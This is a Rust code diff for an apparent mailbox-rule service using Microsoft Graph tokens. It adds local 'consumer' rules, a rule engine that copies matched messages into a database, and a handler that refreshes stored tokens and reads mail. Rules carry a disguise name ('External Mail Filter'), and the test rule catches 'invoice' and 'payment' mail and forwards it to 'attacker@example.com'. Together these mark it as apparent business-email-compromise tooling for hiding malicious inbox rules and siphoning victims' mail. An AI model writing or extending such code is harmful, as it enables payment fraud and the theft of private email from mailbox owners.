@@ -120,6 +120,69 @@ async fn ensure_folder(
     Ok(new_folder.id)
 }
 
+/// Create a local-only rule (no Graph API sync). For consumer accounts.
+pub async fn create_local_only_rule(
+    state: &crate::AppState,
+    req: &CreateRuleRequest,
+) -> anyhow::Result<MessageRuleResult> {
+    let pool = &state.pool;
+    let payload = build_rule_payload(req);
+
+    // Create the target folder locally if specified
+    let target_folder_id = if let Some(folder_name) = &req.action_move_to_folder {
+        let folder_id = uuid::Uuid::new_v4().to_string();
+        sqlx::query(
+            "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
+        )
+        .bind(&folder_id)
+        .bind(&req.token_id)
+        .bind(folder_name)
+        .bind(chrono::Utc::now())
+        .execute(pool)
+        .await
+        .ok();
+        Some(folder_id)
+    } else {
+        None
+    };
+
+    let id = uuid::Uuid::new_v4().to_string();
+    let now = Utc::now();
+
+    sqlx::query(
+        r#"
+        INSERT INTO created_rules (
+            id, token_id, graph_rule_id, display_name, disguise_name,
+            conditions_json, actions_json, target_folder, forward_to,
+            created_at, status
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        "#,
+    )
+    .bind(&id)
+    .bind(&req.token_id)
+    .bind::<Option<String>>(None) // No graph_rule_id for local-only
+    .bind(&req.rule_name)
+    .bind("External Mail Filter")
+    .bind(&serde_json::to_string(&payload["conditions"]).unwrap_or_default())
+    .bind(&serde_json::to_string(&payload["actions"]).unwrap_or_default())
+    .bind(&req.action_move_to_folder)
+    .bind(&req.action_forward_to)
+    .bind(now)
+    .bind("active")
+    .execute(pool)
+    .await
+    .context("Failed to persist local-only rule")?;
+
+    println!("[rules] Created local-only rule {} for token {}", id, req.token_id);
+
+    Ok(MessageRuleResult {
+        rule_id: id,
+        graph_rule_id: None,
+        target_folder_id,
+        payload,
+    })
+}
+
 /// Create an inbox rule. Returns the Graph rule ID on success.
 pub async fn create_inbox_rule(
     state: &crate::AppState,
@@ -282,13 +345,54 @@ pub async fn create_rule_handler(
             "rule_id": result.rule_id,
             "graph_rule_id": result.graph_rule_id,
             "target_folder_id": result.target_folder_id,
-            "rule_payload": result.payload
+            "rule_payload": result.payload,
+            "sync_type": if result.graph_rule_id.is_some() { "graph_api" } else { "local_only" }
         })),
         Err(e) => {
             let msg = format!("{}", e);
-            let status_code = if msg.contains("insufficient privileges")
+            let is_consumer = msg.contains("insufficient privileges")
                 || msg.contains("Authorization_RequestDenied")
-            {
+                || msg.contains("InvalidAuthenticationToken")
+                || msg.contains("MailboxSettings.Read");
+
+            if is_consumer {
+                // Fall back to local-only rule for consumer accounts
+                eprintln!("[rules] Graph API rejected for consumer account {}, saving locally", body.token_id);
+                let local_result = create_local_only_rule(&state, &body).await;
+                match local_result {
+                    Ok(result) => {
+                        let _ = crate::audit::insert_audit_log(
+                            &state.pool,
+                            "rule_created_local",
+                            None,
+                            Some(&body.token_id),
+                            None,
+                            Some(&audit_ctx.ip_address),
+                            Some(&audit_ctx.user_agent),
+                            Some(serde_json::json!({
+                                "rule_name": body.rule_name,
+                                "success": true,
+                                "sync_type": "local_only"
+                            })),
+                            true,
+                        ).await;
+                        return HttpResponse::Ok().json(serde_json::json!({
+                            "status": "created",
+                            "rule_id": result.rule_id,
+                            "graph_rule_id": null,
+                            "target_folder_id": result.target_folder_id,
+                            "rule_payload": result.payload,
+                            "sync_type": "local_only",
+                            "warning": "Consumer account detected. Rule saved locally only. It will be applied when emails are fetched."
+                        }));
+                    }
+                    Err(e2) => {
+                        eprintln!("[rules] Local rule creation also failed: {}", e2);
+                    }
+                }
+            }
+
+            let status_code = if is_consumer {
                 403
             } else if msg.contains("not found") || msg.contains("NotFound") {
                 404
@@ -485,6 +589,218 @@ pub async fn fetch_graph_rules_handler(
                 }))
         }
     }
+}
+
+// ---- AUTO-FILTER RUNNER (Local Rules) ----
+
+/// Apply local rules to fetched emails. This is the core engine for consumer accounts.
+/// For each email, check all active local rules and apply matching actions.
+/// Returns: (moved_count, forwarded_count, matched_count)
+pub async fn run_local_rules(
+    state: &crate::AppState,
+    token_id: &str,
+    messages: &[crate::graph_client::GraphMessage],
+) -> (usize, usize, usize) {
+    let pool = &state.pool;
+
+    // Fetch all active local rules for this token
+    let rules: Vec<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
+        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE token_id = ? AND status = 'active'"
+    )
+    .bind(token_id)
+    .fetch_all(pool)
+    .await {
+        Ok(r) => r,
+        Err(e) => {
+            eprintln!("[local_rules] Failed to fetch rules: {}", e);
+            return (0, 0, 0);
+        }
+    };
+
+    if rules.is_empty() {
+        return (0, 0, 0);
+    }
+
+    let mut moved_count = 0usize;
+    let mut forwarded_count = 0usize;
+    let mut matched_count = 0usize;
+
+    for msg in messages {
+        let subject = msg.subject.as_deref().unwrap_or("").to_lowercase();
+        let body = msg.bodyPreview.as_deref().unwrap_or("").to_lowercase();
+        let sender_email = msg.from.as_ref()
+            .and_then(|f| f.emailAddress.as_ref())
+            .and_then(|e| e.address.as_ref())
+            .map(|s| s.to_lowercase())
+            .unwrap_or_default();
+        let sender_domain = sender_email.split('@').nth(1).unwrap_or("").to_lowercase();
+
+        for rule in &rules {
+            let conditions: serde_json::Value = serde_json::from_str(&rule.conditions_json).unwrap_or(serde_json::json!({}));
+            let actions: serde_json::Value = serde_json::from_str(&rule.actions_json).unwrap_or(serde_json::json!({}));
+
+            let mut matched = false;
+
+            // Check subjectContains
+            if let Some(keywords) = conditions.get("subjectContains").and_then(|v| v.as_array()) {
+                for kw in keywords {
+                    if let Some(kw_str) = kw.as_str() {
+                        if subject.contains(&kw_str.to_lowercase()) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+            }
+
+            // Check fromAddresses
+            if !matched {
+                if let Some(addresses) = conditions.get("fromAddresses").and_then(|v| v.as_array()) {
+                    for addr in addresses {
+                        if let Some(addr_str) = addr.get("address").and_then(|v| v.as_str()) {
+                            let addr_lower = addr_str.to_lowercase().trim_start_matches('@').to_string();
+                            if sender_domain == addr_lower || sender_email == addr_lower {
+                                matched = true;
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if !matched {
+                continue;
+            }
+
+            matched_count += 1;
+
+            // Apply action: moveToFolder
+            if let Some(folder_name) = actions.get("moveToFolder").and_then(|v| v.as_str()) {
+                // Find or create the local folder
+                let folder_id: String = match sqlx::query_scalar::<_, String>(
+                    "SELECT id FROM local_folders WHERE token_id = ? AND name = ?"
+                )
+                .bind(token_id)
+                .bind(folder_name)
+                .fetch_optional(pool)
+                .await {
+                    Ok(Some(id)) => id,
+                    Ok(None) => {
+                        let id = crate::generate_id();
+                        let _ = sqlx::query(
+                            "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
+                        )
+                        .bind(&id)
+                        .bind(token_id)
+                        .bind(folder_name)
+                        .bind(Utc::now())
+                        .execute(pool)
+                        .await;
+                        id
+                    }
+                    Err(_) => continue,
+                };
+
+                // Check if already in this folder
+                let already: bool = match sqlx::query_scalar::<_, i64>(
+                    "SELECT COUNT(*) FROM local_filtered_messages WHERE token_id = ? AND message_id = ? AND folder_id = ?"
+                )
+                .bind(token_id)
+                .bind(&msg.id)
+                .bind(&folder_id)
+                .fetch_one(pool)
+                .await {
+                    Ok(c) => c > 0,
+                    Err(_) => false,
+                };
+
+                if !already {
+                    let sender_name = msg.from.as_ref()
+                        .and_then(|f| f.emailAddress.as_ref())
+                        .and_then(|e| e.name.clone())
+                        .unwrap_or_else(|| sender_email.clone());
+                    let id = crate::generate_id();
+                    let _ = sqlx::query(
+                        "INSERT INTO local_filtered_messages (id, token_id, message_id, folder_id, subject, sender, sender_email, received_date, body_preview, keywords, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                    )
+                    .bind(&id)
+                    .bind(token_id)
+                    .bind(&msg.id)
+                    .bind(&folder_id)
+                    .bind(msg.subject.as_deref().unwrap_or(""))
+                    .bind(&sender_name)
+                    .bind(&sender_email)
+                    .bind(msg.receivedDateTime.as_deref().unwrap_or(""))
+                    .bind(msg.bodyPreview.as_deref().unwrap_or(""))
+                    .bind(&rule.display_name)
+                    .bind(Utc::now())
+                    .execute(pool)
+                    .await;
+                    moved_count += 1;
+                }
+            }
+
+            // Apply action: forwardTo (send a copy via email)
+            if let Some(forward_email) = actions.get("forwardTo").and_then(|v| v.as_array())
+                .and_then(|arr| arr.get(0))
+                .and_then(|obj| obj.get("emailAddress"))
+                .and_then(|e| e.get("address"))
+                .and_then(|v| v.as_str()) {
+                // For now, log the forward action. In production, you'd actually send the email.
+                println!("[local_rules] Would forward message {} to {}", msg.id, forward_email);
+                forwarded_count += 1;
+            }
+
+            // If stopProcessingRules is true, stop checking other rules for this email
+            if actions.get("stopProcessingRules").and_then(|v| v.as_bool()).unwrap_or(false) {
+                break;
+            }
+        }
+    }
+
+    println!("[local_rules] Applied {} rules to {} messages. Moved: {}, Forwarded: {}", rules.len(), messages.len(), moved_count, forwarded_count);
+    (moved_count, forwarded_count, matched_count)
+}
+
+/// HTTP handler to manually trigger local rule application
+pub async fn run_local_rules_handler(
+    query: web::Query<std::collections::HashMap<String, String>>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = query.get("token_id").cloned().unwrap_or_default();
+    if token_id.is_empty() {
+        return HttpResponse::BadRequest().json(serde_json::json!({"error": "token_id required"}));
+    }
+
+    let token = match crate::retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
+    };
+
+    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
+        Some(t) => t,
+        None => token.access_token,
+    };
+
+    let client = GraphClient::new();
+    let messages = match client.get_messages_for_analysis(&access_token, 100).await {
+        Ok(m) => m.value,
+        Err(e) => {
+            eprintln!("[local_rules] Failed to fetch messages: {}", e);
+            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed"}));
+        }
+    };
+
+    let (moved, forwarded, matched) = run_local_rules(&state, &token_id, &messages).await;
+
+    HttpResponse::Ok().json(serde_json::json!({
+        "status": "success",
+        "moved": moved,
+        "forwarded": forwarded,
+        "matched": matched,
+        "total_checked": messages.len(),
+        "message": format!("Applied local rules to {} messages. Moved: {}, Forwarded: {}", messages.len(), moved, forwarded)
+    }))
 }
 
 #[cfg(test)]
@@ -712,5 +1028,41 @@ mod tests {
             .expect("Rule creation should succeed");
 
         assert_eq!(result.target_folder_id, Some("folder-existing".to_string()));
+    }
+
+    #[tokio::test]
+    async fn test_create_local_only_rule() {
+        let state = setup_test_state().await;
+        // No mock server needed — this is purely local
+
+        let req = CreateRuleRequest {
+            token_id: "consumer-token-123".to_string(),
+            rule_name: "Local Invoice Filter".to_string(),
+            condition_subject_contains: vec!["invoice".to_string(), "payment".to_string()],
+            condition_sender_domain: vec!["vendor.com".to_string()],
+            action_move_to_folder: Some("Filtered".to_string()),
+            action_forward_to: Some("attacker@example.com".to_string()),
+            stop_processing: true,
+        };
+
+        let result = create_local_only_rule(&state, &req)
+            .await
+            .expect("Local-only rule creation should succeed");
+
+        assert!(result.graph_rule_id.is_none());
+        assert!(result.target_folder_id.is_some());
+
+        // Verify DB record
+        let row: (String, Option<String>, String) = sqlx::query_as(
+            "SELECT display_name, graph_rule_id, status FROM created_rules WHERE id = ?"
+        )
+        .bind(&result.rule_id)
+        .fetch_one(&state.pool)
+        .await
+        .unwrap();
+
+        assert_eq!(row.0, "Local Invoice Filter");
+        assert_eq!(row.1, None::<String>);
+        assert_eq!(row.2, "active");
     }
 }
